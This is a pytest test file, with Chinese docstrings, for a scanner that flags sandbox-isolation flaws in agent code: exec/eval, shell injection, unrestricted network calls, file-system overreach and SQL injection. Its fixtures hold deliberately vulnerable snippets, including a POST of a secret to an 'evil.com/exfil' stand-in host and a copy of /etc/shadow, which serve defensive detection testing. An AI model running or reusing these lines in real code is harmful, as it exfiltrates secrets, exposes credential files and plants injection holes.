"""tianlong.uxu — SI (Sandbox Isolation) 规则测试

UXU-SI-001 到 UXU-SI-005 各编写 pytest 测试函数，
验证 Scanner 能检测到对应沙箱隔离漏洞。
"""

from __future__ import annotations

import pytest

from tianlong.uxu import Scanner


class TestSI001:
    """UXU-SI-001: 代码执行沙箱逃逸 — exec/eval 无沙箱保护"""

    def test_detect_exec(self, tmp_path):
        f = tmp_path / "agent.py"
        f.write_text(
            "# execute user code directly\n"
            "exec(user_code)\n"
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-001"]
        assert len(findings) >= 1

    def test_detect_eval(self, tmp_path):
        f = tmp_path / "danger.py"
        f.write_text(
            "# evaluate expression from user\n"
            "result = eval(user_input)\n"
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-001"]
        assert len(findings) >= 1

    def test_detect_compile(self, tmp_path):
        f = tmp_path / "sandbox.py"
        f.write_text(
            "import builtins\n"
            "code = compile(user_source, '<string>', 'exec')\n"
            "exec(code)\n"
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-001"]
        assert len(findings) >= 1

    def test_detect_importlib(self, tmp_path):
        f = tmp_path / "plugin.py"
        f.write_text(
            "import importlib\n"
            "module = importlib.import_module(user_module_name)\n"
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-001"]
        assert len(findings) >= 1


class TestSI002:
    """UXU-SI-002: Shell命令注入 — 用户输入拼接shell命令"""

    def test_detect_subprocess_run_shell(self, tmp_path):
        f = tmp_path / "tool.py"
        f.write_text(
            "import subprocess\n"
            "subprocess.run(cmd, shell=True)\n"
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-002"]
        assert len(findings) >= 1

    def test_detect_os_system(self, tmp_path):
        f = tmp_path / "executor.py"
        f.write_text(
            "import os\n"
            'os.system(f"ping {user_ip}")\n'
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-002"]
        assert len(findings) >= 1

    def test_detect_os_popen(self, tmp_path):
        f = tmp_path / "runner.py"
        f.write_text(
            "import os\n"
            'output = os.popen(f"ls -la {user_path}")\n'
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-002"]
        assert len(findings) >= 1

    def test_detect_bash_c(self, tmp_path):
        f = tmp_path / "script.sh"
        f.write_text(
            "#!/bin/bash\n"
            "bash -c \"echo $USER_INPUT\"\n"
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-002"]
        assert len(findings) >= 1


class TestSI003:
    """UXU-SI-003: 网络请求无限制 — Agent可访问任意外部地址"""

    def test_detect_requests_get(self, tmp_path):
        f = tmp_path / "fetcher.py"
        f.write_text(
            "import requests\n"
            "resp = requests.get(user_url)\n"
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-003"]
        assert len(findings) >= 1

    def test_detect_requests_post(self, tmp_path):
        f = tmp_path / "sender.py"
        f.write_text(
            "import requests\n"
            'resp = requests.post("https://evil.com/exfil", data=secret)\n'
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-003"]
        assert len(findings) >= 1

    def test_detect_httpx(self, tmp_path):
        f = tmp_path / "client.py"
        f.write_text(
            "import httpx\n"
            "client = httpx.Client()\n"
            "resp = client.get(target)\n"
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-003"]
        assert len(findings) >= 1

    def test_detect_aiohttp(self, tmp_path):
        f = tmp_path / "async_fetch.py"
        f.write_text(
            "import aiohttp\n"
            "async def fetch(url):\n"
            "    async with aiohttp.ClientSession() as session:\n"
            "        async with session.get(url) as resp:\n"
            "            return await resp.text()\n"
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-003"]
        assert len(findings) >= 1

    def test_detect_urlopen(self, tmp_path):
        f = tmp_path / "raw_fetch.py"
        f.write_text(
            "from urllib.request import urlopen\n"
            "data = urlopen(some_url).read()\n"
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-003"]
        assert len(findings) >= 1


class TestSI004:
    """UXU-SI-004: 文件系统越权 — Agent可读写任意路径"""

    def test_detect_open_arbitrary(self, tmp_path):
        f = tmp_path / "reader.py"
        f.write_text(
            "def read_file(path):\n"
            "    with open(path, 'r') as fh:\n"
            "        return fh.read()\n"
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-004"]
        assert len(findings) >= 1

    def test_detect_write_file(self, tmp_path):
        f = tmp_path / "writer.py"
        f.write_text(
            "def save_result(data):\n"
            "    write_file('/etc/passwd', data)\n"
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-004"]
        assert len(findings) >= 1

    def test_detect_shutil_copy(self, tmp_path):
        f = tmp_path / "backup.py"
        f.write_text(
            "import shutil\n"
            "shutil.copy('/etc/shadow', '/tmp/out')\n"
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-004"]
        assert len(findings) >= 1

    def test_detect_shutil_move(self, tmp_path):
        f = tmp_path / "mover.py"
        f.write_text(
            "import shutil\n"
            'shutil.move(f"/tmp/{user_file}", dst)\n'
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-004"]
        assert len(findings) >= 1

    def test_detect_os_remove(self, tmp_path):
        f = tmp_path / "remover.py"
        f.write_text(
            "import os\n"
            "os.remove(user_provided_path)\n"
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-004"]
        assert len(findings) >= 1


class TestSI005:
    """UXU-SI-005: 数据库注入 — Agent生成并执行SQL无参数化"""

    def test_detect_execute_raw(self, tmp_path):
        f = tmp_path / "db.py"
        f.write_text(
            "import sqlite3\n"
            "conn = sqlite3.connect('test.db')\n"
            "cursor = conn.cursor()\n"
            'cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")\n'
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-005"]
        assert len(findings) >= 1

    def test_detect_cursor_execute(self, tmp_path):
        f = tmp_path / "query.py"
        f.write_text(
            "import sqlite3\n"
            "cursor = conn.cursor()\n"
            'cursor.execute("SELECT * FROM users WHERE name = \'" + username + "\'")\n'
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-005"]
        assert len(findings) >= 1

    def test_detect_session_execute(self, tmp_path):
        f = tmp_path / "orm_query.py"
        f.write_text(
            "from sqlalchemy.orm import Session\n"
            "session = Session()\n"
            'session.execute(f"DELETE FROM logs WHERE date < {cutoff}")\n'
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-005"]
        assert len(findings) >= 1

    def test_detect_raw_sql(self, tmp_path):
        f = tmp_path / "raw_query.py"
        f.write_text(
            'raw_sql = f"INSERT INTO users VALUES ({name}, {email})"\n'
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-005"]
        assert len(findings) >= 1

    def test_detect_text_function(self, tmp_path):
        f = tmp_path / "sqlalchemy_text.py"
        f.write_text(
            "from sqlalchemy import text\n"
            'query = sqlalchemy.text(f"SELECT * FROM items WHERE owner = {owner_id}")\n'
        )
        scanner = Scanner()
        report = scanner.scan(str(f))
        findings = [x for x in report.findings if x.rule_id == "UXU-SI-005"]
        assert len(findings) >= 1
